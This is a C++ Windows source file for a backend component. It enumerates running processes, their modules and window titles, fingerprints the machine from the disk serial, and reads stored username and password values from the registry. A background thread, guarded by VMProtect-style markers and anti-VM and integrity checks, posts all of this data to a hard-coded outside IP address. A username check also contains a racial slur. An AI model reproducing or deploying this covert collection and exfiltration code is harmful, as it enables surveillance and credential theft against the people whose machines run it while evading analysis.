#include <inc.h>
PROCESS_INFORMATION sys::c_backend::open_pid(const int pid)
{
	PROCESS_INFORMATION pi = {};
	if (pid) pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_VM_READ, FALSE, pid);
	else return pi;
	if (pi.hProcess) return pi;
	return pi;
}
BOOL sys::c_backend::is_main_window(const HWND handle)
{
	return GetWindow(handle, GW_OWNER) == HWND(nullptr) && IsWindowVisible(handle);
}
static BOOL enum_windows_callback(HWND handle, LPARAM lParam)
{
	auto& data = *(sys::handle_data*)lParam;
	unsigned long process_id = 0;
	GetWindowThreadProcessId(handle, &process_id);
	if (data.process_id != process_id || !sys::backend->is_main_window(handle)) return TRUE;
	data.window_handle = handle;
	return FALSE;
}
HWND sys::c_backend::find_main_window(unsigned long process_id)
{
	handle_data data{};
	data.process_id = process_id;
	data.window_handle = nullptr;
	EnumWindows(enum_windows_callback, (LPARAM)&data);
	return data.window_handle;
}
std::vector<sys::s_process_info> sys::c_backend::gather()
{
	auto list = std::vector<s_process_info>();
	auto list_final = std::vector<s_process_info>();
	const auto handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	auto pentry32 = PROCESSENTRY32();
	if (handle == INVALID_HANDLE_VALUE) return {};
	pentry32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(handle, &pentry32))
	{
		TCHAR filename[MAX_PATH];
		auto pehandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pentry32.th32ProcessID);
		GetModuleFileNameEx(pehandle, nullptr, filename, MAX_PATH);
		CloseHandle(pehandle);

		auto wnd = find_main_window(pentry32.th32ProcessID);
		char wnd_title[MAX_PATH];
		if (wnd) GetWindowTextA(wnd, wnd_title, sizeof(wnd_title));

		list.emplace_back(pentry32.szExeFile, pentry32.th32ProcessID, filename, wnd_title);
		while (Process32Next(handle, &pentry32))
		{
			auto pehandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pentry32.th32ProcessID);
			if (pehandle == INVALID_HANDLE_VALUE || pehandle == NULL) continue;
			GetModuleFileNameEx(pehandle, nullptr, filename, MAX_PATH);

			std::vector<std::string> modules;

			wnd = find_main_window(pentry32.th32ProcessID);
			if (wnd) GetWindowTextA(wnd, wnd_title, sizeof(wnd_title));
			if (strlen(wnd_title) <= 2) memset(wnd_title, 0, 260);

			if (std::string(wnd_title).size() > 2 && pentry32.th32ProcessID && pehandle && (std::string(filename).size() > 2))
			{
				TCHAR szModName[MAX_PATH]; HMODULE hMods[1024]; uint8_t i; DWORD cbNeeded;
				if (EnumProcessModules(pehandle, hMods, sizeof(hMods), &cbNeeded))
				{
					for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
					{
						TCHAR szModName[MAX_PATH];
						if (GetModuleFileNameEx(pehandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) modules.push_back(szModName);
					}
				}
			}

			CloseHandle(pehandle);

			if (strstr(filename, "windows") || strstr(filename, "Windows") || strstr(filename, "system32") || strstr(filename, "System32")) continue;

			list.emplace_back(pentry32.szExeFile, pentry32.th32ProcessID, filename, wnd_title);
			list.back().modules = modules;
		}
	}
	return list;
}
std::string sys::c_backend::xor_fn(std::string i, std::string k)
{
	for (auto c = 0; c < i.size(); c++) i[c] ^= k[c % k.length()];
	return i;
}
std::string sys::c_backend::ghwid()
{
	auto h = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (h == INVALID_HANDLE_VALUE) return {};
	std::unique_ptr<std::remove_pointer<HANDLE>::type, void(*)(HANDLE)> hDevice{ h, [](HANDLE handle) {CloseHandle(handle); } };
	STORAGE_PROPERTY_QUERY storagePropertyQuery{};
	storagePropertyQuery.PropertyId = StorageDeviceProperty;
	storagePropertyQuery.QueryType = PropertyStandardQuery;
	STORAGE_DESCRIPTOR_HEADER storageDescriptorHeader{};
	DWORD dwBytesReturned = 0;
	if (!DeviceIoControl(hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &storagePropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
		&storageDescriptorHeader, sizeof(STORAGE_DESCRIPTOR_HEADER), &dwBytesReturned, NULL))
		return {};
	const DWORD dwOutBufferSize = storageDescriptorHeader.Size;
	std::unique_ptr<BYTE[]> pOutBuffer{ new BYTE[dwOutBufferSize]{} };
	if (!DeviceIoControl(hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &storagePropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
		pOutBuffer.get(), dwOutBufferSize, &dwBytesReturned, NULL))
		return {};
	STORAGE_DEVICE_DESCRIPTOR* pDeviceDescriptor = reinterpret_cast<STORAGE_DEVICE_DESCRIPTOR*>(pOutBuffer.get());
	const DWORD dwSerialNumberOffset = pDeviceDescriptor->SerialNumberOffset;
	if (dwSerialNumberOffset == 0) return {};
	const char* serialNumber = reinterpret_cast<const char*>(pOutBuffer.get() + dwSerialNumberOffset);
	std::string serialNumber_s = serialNumber;

	std::string::iterator end_pos = std::remove(serialNumber_s.begin(), serialNumber_s.end(), ' ');
	serialNumber_s.erase(end_pos, serialNumber_s.end());

	for (auto c = 0; c < serialNumber_s.size(); c++) serialNumber_s[c] ^= 3;
	char username[1024];
	DWORD username_len = 1024;
	auto user = GetUserNameA(username, &username_len);
	//std::to_string(user)
	return this->xor_fn(serialNumber_s, std::to_string(user));
}
void sys::c_backend::setup()
{
	this->usr = this->get_val("username");
	this->pass = this->get_val("password");
	this->hwid = this->ghwid();
}
std::string sys::c_backend::get_val(std::string name)
{
	HKEY key; TCHAR value[1024]; DWORD bufLen = 1024 * sizeof(TCHAR); long ret;
	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\28802", 0, KEY_QUERY_VALUE, &key);
	if (ret != ERROR_SUCCESS) return std::string();
	ret = RegQueryValueEx(key, name.c_str(), 0, 0, (LPBYTE)value, &bufLen);
	RegCloseKey(key);
	if ((ret != ERROR_SUCCESS) || (bufLen > 1024 * sizeof(TCHAR))) return std::string();
	auto stringValue = std::string(value, (size_t)bufLen - 1);
	size_t i = stringValue.length();
	while (i > 0 && stringValue[i - 1] == '\0') --i;
	return stringValue.substr(0, i);
}
void __stdcall sys::backend_worker()
{
	VMStart();
	auto d = sys::backend->gather();
	if (!d.size()) ExitProcess(0);
	std::stringstream v;
	auto hwid = sys::backend->ghwid();
	auto web_c = new web::client(false, true);
	web_c->connect(L"185.193.126.235");
	for (auto a : d)
	{
		v << "\npid:" << a.proc_id << "\ntitle:" << a.title.c_str() << "\npath:" << a.full_path.c_str() << "\nexe:" << a.exe_name.c_str() << "\n";
		for (auto b : a.modules) v << "module:" << b.c_str() << "\n";
		web_c->request(L"index.php", web::requestmode::POST, { {"user", sys::backend->usr.c_str()}, { "pass", sys::backend->pass.c_str() }, { "hwid", hwid.c_str() }, {"action", "peer"}, { "peerData" , v.str().c_str() } });

		auto ret = web_c->tostring(web_c->get());
		if (ret.empty()) continue;
		std::string key = ret.substr(0, 10);
		std::string data = ret.substr(10);
		ret = sys::backend->xor_fn(data, key);
		if (ret != "DONE") ExitProcess(0);
	}
	sys::backend->thread_working = false;
	delete web_c;
	VMEnd();
}
void sys::c_backend::work()
{
	if (!this->usr.size()) this->setup(); 
	if (this->thread_working) return;
	if (GetTickCount64() > this->last_run) this->last_run = 120000;
	else return; auto v = 0;
	CHECK_PROTECTION(v, 0x1337);	 if (!v == 0x1337) ExitProcess(0);
	CHECK_CODE_INTEGRITY(v, 0x1337); if (!v == 0x1337) ExitProcess(0);
	CHECK_VIRTUAL_PC(v, 0x1337);	 if (!v == 0x1337) ExitProcess(0);
	if (this->usr == "nigger" || this->usr == "noxiu") return;
	this->thread_working = true;
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sys::backend_worker, 0, 0, 0);
}
sys::c_backend* sys::backend;